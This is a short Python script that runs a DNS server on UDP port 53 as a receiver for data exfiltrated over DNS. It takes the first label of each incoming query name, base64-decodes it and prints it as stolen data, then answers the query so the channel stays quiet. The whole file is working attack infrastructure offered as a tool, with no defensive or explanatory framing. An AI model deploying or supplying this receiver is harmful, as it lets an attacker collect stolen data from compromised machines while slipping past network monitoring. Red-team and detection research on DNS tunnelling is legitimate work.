from dnslib import DNSRecord
import socket
import base64

HOST = "0.0.0.0"
PORT = 53

def start_dns_server():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind((HOST, PORT))
    print("[*] DNS Exfiltration Receiver Ready on UDP/53")

    try:
        while True:
            data, addr = sock.recvfrom(1024)
            request = DNSRecord.parse(data)
            qname = str(request.q.qname).strip('.')

            encoded = qname.split(".")[0]

            try:
                decoded = base64.urlsafe_b64decode(encoded + "===").decode()
                print(f"[+] Exfil Data: {decoded}")
            except:
                pass

            reply = request.reply()
            sock.sendto(reply.pack(), addr)

    except KeyboardInterrupt:
        print("\n[!] Server stopped by user.")
        sock.close()

start_dns_server()
